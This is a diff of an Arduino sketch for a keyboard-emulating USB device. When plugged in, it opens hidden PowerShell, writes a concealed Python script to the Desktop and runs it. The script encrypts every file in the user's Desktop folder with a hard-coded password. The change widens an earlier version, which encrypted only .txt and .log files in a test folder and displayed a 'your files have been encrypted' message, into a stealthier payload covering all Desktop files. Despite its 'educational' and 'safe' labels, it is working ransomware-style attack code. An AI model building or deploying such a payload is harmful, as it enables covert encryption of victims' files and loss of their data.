@@ -4,112 +4,180 @@
 
 USBHIDKeyboard Keyboard;
 
-int ms1 = 10;
-int ms2 = ms1 * 2;
+//================= User Settings =================
 
-const char* Key = "12345678"; // Password
-const char* text = "Congratulations, your test_data file have been encrypted.";
+// Mode selector: 
+//   "e" = encrypt, "d" = decrypt
+//   Set before flashing the sketch
+const char* MODE = "e";
 
-void typeLine(const char* line, int wait = 10) {
+// Typing delay multiplier: 
+//   Smaller values = faster keystrokes
+//   Must be >= 1.0 for stability
+float speed = 20.0;   
+
+//==================================================
+
+//--------------------------------------------------
+// Function: typeLine
+// Purpose : Types a given string into the host, 
+//           presses RETURN, then waits briefly.
+// Params  : const char* line - the text to type.
+//--------------------------------------------------
+void typeLine(const char* line) {
   Keyboard.print(line);
   Keyboard.write(KEY_RETURN);
-  delay(wait);
+  delay(speed * 0.5); // Short pause to ensure command is processed
 }
 
-void typeProgram(const char* program) {
-  Keyboard.press(KEY_LEFT_GUI);
-  Keyboard.press('r');
-  delay(ms1);
-  Keyboard.releaseAll();
-  delay(ms2);
-  typeLine(program);
-  delay(150);
-}
-
+//--------------------------------------------------
+// Function: setup
+// Purpose : Initializes USB HID, launches hidden 
+//           PowerShell, types an embedded Python 
+//           script that performs encryption or 
+//           decryption (with auto library install).
+//--------------------------------------------------
 void setup() {
+  // Initialize USB HID
   USB.begin();
   Keyboard.begin();
-  delay(500); // Let OS detect USB device
+  delay(speed * 30); // Initial pause to ensure OS readiness
 
-  // CMD on the Desktop
-  typeProgram("cmd");
-  typeLine("cd %userprofile%\\Desktop");
+  // Open Windows Run dialog (Win+R)
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('r');
+  Keyboard.releaseAll();
+  delay(speed * 15);
 
-  // Create Python script via echo
-  typeLine("echo import os > encryptor.py");
-  typeLine("echo import base64 >> encryptor.py");
-  typeLine("echo import getpass >> encryptor.py");
-  typeLine("echo from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC >> encryptor.py");
-  typeLine("echo from cryptography.fernet import Fernet >> encryptor.py");
-  typeLine("echo from cryptography.hazmat.primitives import hashes >> encryptor.py");
-  typeLine("echo from cryptography.hazmat.backends import default_backend >> encryptor.py");
-  typeLine("echo. >> encryptor.py");
+  // Launch PowerShell in hidden window
+  Keyboard.print("powershell -WindowStyle Hidden");
+  delay(speed * 4);
+  Keyboard.write(KEY_RETURN);
+  delay(speed * 20);
 
-  typeLine("echo def derive_key(password, salt): >> encryptor.py");
-  typeLine("echo     kdf = PBKDF2HMAC( >> encryptor.py");
-  typeLine("echo         algorithm=hashes.SHA256(), >> encryptor.py");
-  typeLine("echo         length=32, >> encryptor.py");
-  typeLine("echo         salt=salt, >> encryptor.py");
-  typeLine("echo         iterations=390000, >> encryptor.py");
-  typeLine("echo         backend=default_backend() >> encryptor.py");
-  typeLine("echo     ) >> encryptor.py");
-  typeLine("echo     return base64.urlsafe_b64encode(kdf.derive(password.encode())) >> encryptor.py");
-  typeLine("echo. >> encryptor.py");
+  // Start PowerShell here-string for Python script content
+  typeLine("@\"");
 
-  typeLine("echo def encrypt_folder(folder, fernet): >> encryptor.py");
-  typeLine("echo     for root, _, files in os.walk(folder): >> encryptor.py");
-  typeLine("echo         for file in files: >> encryptor.py");
-  typeLine("echo             if file.endswith('.txt') or file.endswith('.log'): >> encryptor.py");
-  typeLine("echo                 path = os.path.join(root, file) >> encryptor.py");
-  typeLine("echo                 with open(path, 'rb') as f: >> encryptor.py");
-  typeLine("echo                     data = f.read() >> encryptor.py");
-  typeLine("echo                 with open(path, 'wb') as f: >> encryptor.py");
-  typeLine("echo                     f.write(fernet.encrypt(data)) >> encryptor.py");
-  typeLine("echo                 print(f'[+] Encrypted: {path}') >> encryptor.py");
-  typeLine("echo. >> encryptor.py");
+  // ---- Python script begins ----
+  typeLine("import os, sys, time, base64, shutil, subprocess");
+  typeLine("try:");
+  typeLine("    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC");
+  typeLine("    from cryptography.fernet import Fernet");
+  typeLine("    from cryptography.hazmat.primitives import hashes");
+  typeLine("    from cryptography.hazmat.backends import default_backend");
+  typeLine("except ImportError:");
+  typeLine("    print('[!] cryptography not found. Installing...')");
+  typeLine("    subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'cryptography'])");
+  typeLine("    print('[+] Installed. Restarting script...')");
+  typeLine("    os.execv(sys.executable, [sys.executable] + sys.argv)");
+  typeLine("");
+  typeLine("TARGET_FOLDER = os.path.join(os.path.expanduser('~'), 'Desktop')");
+  typeLine("SALT = b'educational_demo_salt!'");
+  typeLine("ITERATIONS = 390000");
+  typeLine("KEY_FILE = 'keyfile.key'");
+  typeLine("KEY_BACKUP_FILE = os.path.expanduser('~/Documents/keyfile_backup.key')");
+  typeLine("LOG_FILE = 'encryptor.log'");
+  typeLine("PASSWORD = '12345678'");
+  typeLine(("MODE = '" + String(MODE) + "'").c_str());
+  typeLine("");
+  typeLine("def log(msg):");
+  typeLine("    with open(LOG_FILE, 'a', encoding='utf-8') as f:");
+  typeLine("        f.write(f\"{time.strftime('%Y-%m-%d %H:%M:%S')} - {msg}\\n\")");
+  typeLine("    print(msg)");
+  typeLine("");
+  typeLine("def derive_key(password, salt):");
+  typeLine("    kdf = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=salt, iterations=ITERATIONS, backend=default_backend())");
+  typeLine("    return base64.urlsafe_b64encode(kdf.derive(password.encode()))");
+  typeLine("");
+  typeLine("def save_key(key):");
+  typeLine("    with open(KEY_FILE, 'wb') as f: f.write(key)");
+  typeLine("    log(f'[+] Key saved to {KEY_FILE}')");
+  typeLine("    try:");
+  typeLine("        os.makedirs(os.path.dirname(KEY_BACKUP_FILE), exist_ok=True)");
+  typeLine("        shutil.copy2(KEY_FILE, KEY_BACKUP_FILE)");
+  typeLine("        log(f'[+] Backup key saved to {KEY_BACKUP_FILE}')");
+  typeLine("    except Exception as e:");
+  typeLine("        log(f'[!] Failed to backup key: {e}')");
+  typeLine("");
+  typeLine("def load_key():");
+  typeLine("    with open(KEY_FILE, 'rb') as f: key = f.read()");
+  typeLine("    log(f'[+] Key loaded from {KEY_FILE}')");
+  typeLine("    return key");
+  typeLine("");
+  typeLine("def get_all_files(folder):");
+  typeLine("    paths = []");
+  typeLine("    for root, _, files in os.walk(folder):");
+  typeLine("        for file in files:");
+  typeLine("            path = os.path.join(root, file)");
+  typeLine("            if os.path.abspath(path) != os.path.abspath(KEY_FILE):");
+  typeLine("                paths.append(path)");
+  typeLine("    return paths");
+  typeLine("");
+  typeLine("def progress_bar(current, total):");
+  typeLine("    percent = int((current / total) * 100)");
+  typeLine("    bar = '#' * (percent // 2) + '-' * (50 - percent // 2)");
+  typeLine("    sys.stdout.write(f\"\\r[{bar}] {percent}%\")");
+  typeLine("    sys.stdout.flush()");
+  typeLine("");
+  typeLine("def encrypt_folder(folder, fernet):");
+  typeLine("    files = get_all_files(folder)");
+  typeLine("    total = len(files)");
+  typeLine("    for i, path in enumerate(files, 1):");
+  typeLine("        try:");
+  typeLine("            with open(path, 'rb') as f: data = f.read()");
+  typeLine("            with open(path, 'wb') as f: f.write(fernet.encrypt(data))");
+  typeLine("            log(f'[+] Encrypted: {path}')");
+  typeLine("        except Exception as e:");
+  typeLine("            log(f'[!] Failed to encrypt {path}: {e}')");
+  typeLine("        progress_bar(i, total)");
+  typeLine("    print()");
+  typeLine("");
+  typeLine("def decrypt_folder(folder, fernet):");
+  typeLine("    files = get_all_files(folder)");
+  typeLine("    total = len(files)");
+  typeLine("    for i, path in enumerate(files, 1):");
+  typeLine("        try:");
+  typeLine("            with open(path, 'rb') as f: data = f.read()");
+  typeLine("            dec = fernet.decrypt(data)");
+  typeLine("            with open(path, 'wb') as f: f.write(dec)");
+  typeLine("            log(f'[-] Decrypted: {path}')");
+  typeLine("        except Exception as e:");
+  typeLine("            log(f'[!] Failed to decrypt {path}: {e}')");
+  typeLine("        progress_bar(i, total)");
+  typeLine("    print()");
+  typeLine("");
+  typeLine("if __name__ == '__main__':");
+  typeLine("    os.makedirs(TARGET_FOLDER, exist_ok=True)");
+  typeLine("    log('=== Safe Dual-Mode Started ===')");
+  typeLine("    if os.path.exists(KEY_FILE):");
+  typeLine("        log('[*] Key file found.')");
+  typeLine("        key = load_key()");
+  typeLine("    else:");
+  typeLine("        key = derive_key(PASSWORD, SALT)");
+  typeLine("        save_key(key)");
+  typeLine("    fernet = Fernet(key)");
+  typeLine("    if MODE == 'e':");
+  typeLine("        encrypt_folder(TARGET_FOLDER, fernet)");
+  typeLine("    elif MODE == 'd':");
+  typeLine("        decrypt_folder(TARGET_FOLDER, fernet)");
+  typeLine("    else:");
+  typeLine("        log('[!] Invalid mode.')");
+  typeLine("    log('=== Process Finished ===')");
+  // ---- Python script ends ----
 
-  typeLine("echo def decrypt_folder(folder, fernet): >> encryptor.py");
-  typeLine("echo     for root, _, files in os.walk(folder): >> encryptor.py");
-  typeLine("echo         for file in files: >> encryptor.py");
-  typeLine("echo             if file.endswith('.txt') or file.endswith('.log'): >> encryptor.py");
-  typeLine("echo                 path = os.path.join(root, file) >> encryptor.py");
-  typeLine("echo                 with open(path, 'rb') as f: >> encryptor.py");
-  typeLine("echo                     data = f.read() >> encryptor.py");
-  typeLine("echo                 try: >> encryptor.py");
-  typeLine("echo                     decrypted = fernet.decrypt(data) >> encryptor.py");
-  typeLine("echo                     with open(path, 'wb') as f: >> encryptor.py");
-  typeLine("echo                         f.write(decrypted) >> encryptor.py");
-  typeLine("echo                     print(f'[-] Decrypted: {path}') >> encryptor.py");
-  typeLine("echo                 except: >> encryptor.py");
-  typeLine("echo                     print(f'[!] Failed to decrypt: {path}') >> encryptor.py");
-  typeLine("echo. >> encryptor.py");
+  // Save Python script to Desktop as hidden file
+  typeLine("\"@ | Set-Content $env:USERPROFILE\\Desktop\\safe_dual_mode.py");
+  typeLine("Set-ItemProperty \"$env:USERPROFILE\\Desktop\\safe_dual_mode.py\" -Name Attributes -Value Hidden");
 
-  typeLine("echo if __name__ == '__main__': >> encryptor.py");
-  typeLine("echo     folder = './test_data' >> encryptor.py");
-  typeLine("echo     os.makedirs(folder, exist_ok=True) >> encryptor.py");
-  typeLine("echo     password = getpass.getpass('Enter password: ') >> encryptor.py");
-  typeLine("echo     salt = b'educational_demo_salt!' >> encryptor.py");
-  typeLine("echo     key = derive_key(password, salt) >> encryptor.py");
-  typeLine("echo     fernet = Fernet(key) >> encryptor.py");
-  typeLine("echo     mode = input('Mode (e=encrypt, d=decrypt): ').strip().lower() >> encryptor.py");
-  typeLine("echo     if mode == 'e': >> encryptor.py");
-  typeLine("echo         encrypt_folder(folder, fernet) >> encryptor.py");
-  typeLine("echo     elif mode == 'd': >> encryptor.py");
-  typeLine("echo         decrypt_folder(folder, fernet) >> encryptor.py");
-  typeLine("echo     else: >> encryptor.py");
-  typeLine("echo         print('[!] Invalid mode.') >> encryptor.py");
+  // Execute Python script
+  typeLine("python $env:USERPROFILE\\Desktop\\safe_dual_mode.py");
 
-  // Run the script
-  typeLine("python encryptor.py");
-  typeLine(Key); // password aka "key"
-  typeLine("e"); // encrypt
-  typeLine("exit");  // ⬅️ This closes CMD
-
-  // notepad
-  typeProgram("notepad");
-  typeLine(text);
+  // Exit PowerShell session
+  typeLine("exit");
 }
 
-void loop() {
-  // Nothing
-}
+//--------------------------------------------------
+// Function: loop
+// Purpose : Not used; HID payload only runs once.
+//--------------------------------------------------
+void loop() {}
